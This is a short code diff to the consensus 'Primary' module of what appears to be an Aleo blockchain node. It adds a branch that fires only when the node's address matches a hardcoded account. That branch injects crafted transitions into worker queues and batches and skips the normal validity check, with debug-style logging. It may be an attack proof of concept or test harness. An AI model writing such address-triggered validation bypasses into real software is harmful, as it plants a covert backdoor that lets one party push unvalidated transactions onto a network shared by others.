@@ -524,6 +524,19 @@ impl<N: Network> Primary<N> {
                             continue 'inner;
                         }
                         // Check the transmission is still valid.
+                        if self.gateway.account().address().to_string() == "aleo1rhgdu77hgyqd3xjj8ucu3jj9r2krwz6mnzyd80gncr5fxcwlh5rsvzp9px".to_string() {
+                            match inject_transition(transmission.clone()) {
+                                Ok((id,injected_transmssion)) => {
+                                    self.workers[0].reinsert(id, injected_transmssion.clone());
+                                    transmissions.insert(id, injected_transmssion);
+                                    info!("@@@@@@@Injected a transmission");
+                                }
+                                Err(err) => {
+                                    info!("@@@@@@@Failed to inject a transmission: {}", err);
+                                }
+                            }
+                            continue;
+                        }
                         match (id, transmission.clone()) {
                             (TransmissionID::Solution(solution_id), Transmission::Solution(solution)) => {
                                 // Check if the solution is still valid.
